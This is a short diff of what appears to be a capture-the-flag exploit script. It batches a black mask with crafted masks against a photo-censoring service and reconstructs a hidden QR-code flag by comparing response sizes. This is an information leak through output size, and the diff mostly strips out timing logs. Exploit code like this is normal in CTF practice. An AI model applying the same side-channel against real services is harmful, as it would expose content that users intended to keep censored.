@@ -348,27 +348,12 @@ async def exploit_censor(
     p: Photo = photo.get_by_description_contains(
         profile, "a flag but its premium and you are poor", "censored"
     )
-    # start = time.time()
-    # await utils.fill_user(conn, p)
-    # end = time.time()
-    # logger.info(f"fill: {(end - start)}")
 
-    start = time.time()
-    black = photo.gen_mask([], Coordinate(dim, dim))
-    msg = await photo.censor(conn, p.public_id, [black])
-    base_size = get_size(msg[0])
-    end = time.time()
-    logger.info(f"black: {(end - start)}")
-
-    start = time.time()
     masks = photo.exploit_masks(dim)
-    end = time.time()
-    logger.info(f"masks: {(end - start)}")
-
-    start = time.time()
-    res = await photo.censor(conn, p.public_id, masks)
-    end = time.time()
-    logger.info(f"censor: {(end - start)}")
+    black = photo.gen_mask([], Coordinate(dim, dim))
+    responses = await photo.censor(conn, p.public_id, [black] + masks)
+    base_size = get_size(responses[0])
+    res = responses[1:]
 
     start = time.time()
     img = qr.reconstruct_qr(res, base_size, 33)
